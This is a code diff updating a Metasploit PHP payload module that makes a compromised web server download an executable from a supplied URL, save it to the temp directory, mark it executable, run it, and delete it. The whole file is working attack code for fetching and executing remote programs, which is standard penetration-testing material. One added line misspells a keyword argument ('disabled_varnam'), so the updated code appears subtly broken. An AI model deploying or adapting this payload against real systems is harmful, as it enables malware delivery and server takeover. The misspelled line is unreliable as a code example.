@@ -1,14 +1,14 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
 require 'msf/core/payload/php'
 
 
-module Metasploit3
+module MetasploitModule
+
+  CachedSize = :dynamic
 
   include Msf::Payload::Php
   include Msf::Payload::Single
@@ -31,13 +31,14 @@ module Metasploit3
     register_options(
       [
         OptString.new('URL', [ true, "The pre-encoded URL to the executable" ])
-      ], self.class)
+      ])
   end
 
   def php_exec_file
     exename = Rex::Text.rand_text_alpha(rand(8) + 4)
     dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
     shell = <<-END_OF_PHP_CODE
+    #{php_preamble(disabled_varname: dis)}
     if (!function_exists('sys_get_temp_dir')) {
       function sys_get_temp_dir() {
         if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
@@ -53,7 +54,9 @@ module Metasploit3
     }
     $fname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "#{exename}.exe";
     $fd_in = fopen("#{datastore['URL']}", "rb");
+    if ($fd_in === false) { die(); }
     $fd_out = fopen($fname, "wb");
+    if ($fd_out === false) { die(); }
     while (!feof($fd_in)) {
       fwrite($fd_out, fread($fd_in, 8192));
     }
@@ -61,8 +64,7 @@ module Metasploit3
     fclose($fd_out);
     chmod($fname, 0777);
     $c = $fname;
-    #{php_preamble({:disabled_varname => dis})}
-    #{php_system_block({:cmd_varname => "$c", :disabled_varname => dis})}
+    #{php_system_block(cmd_varname: "$c", disabled_varnam: dis)}
     @unlink($fname);
     END_OF_PHP_CODE
 
@@ -76,5 +78,4 @@ module Metasploit3
   def generate
     return php_exec_file
   end
-
 end
